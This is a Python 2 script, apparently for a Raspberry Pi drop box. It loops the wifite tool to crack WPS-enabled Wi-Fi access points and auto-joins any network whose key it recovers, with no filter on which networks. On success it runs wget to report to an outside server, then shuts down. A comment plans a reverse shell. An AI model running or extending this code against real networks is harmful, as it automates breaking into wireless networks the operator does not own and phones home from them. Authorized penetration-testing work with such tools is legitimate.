#!/usr/bin/python2

import os
import sys
import threading
import time
import csv

### Update these values ###
wifite_path = "/usr/bin/wifite"
wifite_output = "/home/pi/wifite/cracked.csv"


wifi_cracked = False

##### Interfacing with Wifite #####
class Target:
    """
        Holds data for a Target (aka Access Point aka Router)
    """
    def __init__(self, bssid, power, data, channel, encryption, ssid):
        self.bssid = bssid
        self.power = power
        self.data  = data
        self.channel = channel
        self.encryption = encryption
        self.ssid = ssid
        self.wps = False # Default to non-WPS-enabled router.
        self.key = ''

def load_cracked():
        """
                Loads info about cracked access points into list, returns list.
        """
        global wifite_output
        result = []
        if not os.path.exists(wifite_output): return result
        with open(wifite_output, 'rb') as csvfile:
                targetreader = csv.reader(csvfile, delimiter=',', quotechar='"')
                for row in targetreader:
                        t = Target(row[0], 0, 0, 0, row[1], row[2])
                        t.key = row[3]
                        t.wps = row[4]
                        result.append(t)
        return result

class WifiteRunner(threading.Thread):
        def run(self):
                global wifi_cracked, wifite_path
                #run wifite in a loop until a desirable network is cracked
                while wifi_cracked == False:
                        #only wps for now, next add WEP and WPA might not really be an option for the Pi
                        os.system("python " + wifite_path + " --all --wps")
                        time.sleep(1)

##### Connect to AP #####
def wpaConnect(bssid, encryption, essid, password, wpsNumber):
    # We have a WPA or WPA 2 Network so we start writing out the configuration file for wpa_supplicant
    print "Writing config file for WPA/WPA2 network"
    handler = open("wpa.conf", "w")
    handler.write("# WPA/WPA2 PSK Config file\r\n")
    handler.write("\r\n")
    handler.write("network={\r\n")
    handler.write("\r\n")
    handler.write(' ssid="' + essid + '"\r\n')
    handler.write(" scan_ssid=1\r\n")
    handler.write(" key_mgmt=WPA-PSK\r\n")
    handler.write(' psk="' + password + '"\r\n')
    handler.write("\r\n")
    handler.write("}")
    handler.close()
                
    # Point wpa_supplicant to the file and specify our interface and driver to use.
    # Note that os.system is used here as otherwise we would not be able to get
    # the error output from wpa_supplicant into out.log
    print "Executing WPA Supplicant...\r\n"
    os.system("wpa_supplicant -D wext -c wpa.conf -i wlan0 | tee out.log")
            
    fileHandler = open("out.log", "r")
    fileHandler.readline()
    line = fileHandler.readline()
       
                       
    if (line[:20] == "Failed to initialize" or line[:14] == "Failed to read"):
        print "\r\nSorry we were unable to connect to the network....\r\n"
        return False               
    else:
        print "\r\nWe successfully connected to the network.\r\n"
        return True

#todo - Tons of stuff
# many of the features are implemented in the other scripts, but still need to be moved over
# this whole script should be OOP'd
# todo - add method for reverse shell(probably ssh with public key auth and autossh)
# todo - reconnect to the wifi if disconnected

##### Actually Running #####

wifite_thread = WifiteRunner()
wifite_thread.start()
result = load_cracked()

while wifi_cracked == False:
        #check if cracked.csv exists
        result = load_cracked()
        for t in result:
                #Try to connect to any APs that have been cracked
                #todo - Add whitelist or filter for bssid/essid
                if wpaConnect(t.bssid, t.encryption, t.ssid, t.key, t.wps):
                        #connection successful
                        wifi_cracked = True
                        #for now, we will use a temporary method to verify we have connected out, then shutdown
                        os.system("wget https://defense.ballastsecurity.net/admin/pentestpi-has-connected -O-")
                        os.system("shutdown -h now")
                        break
                                        
        time.sleep(5)

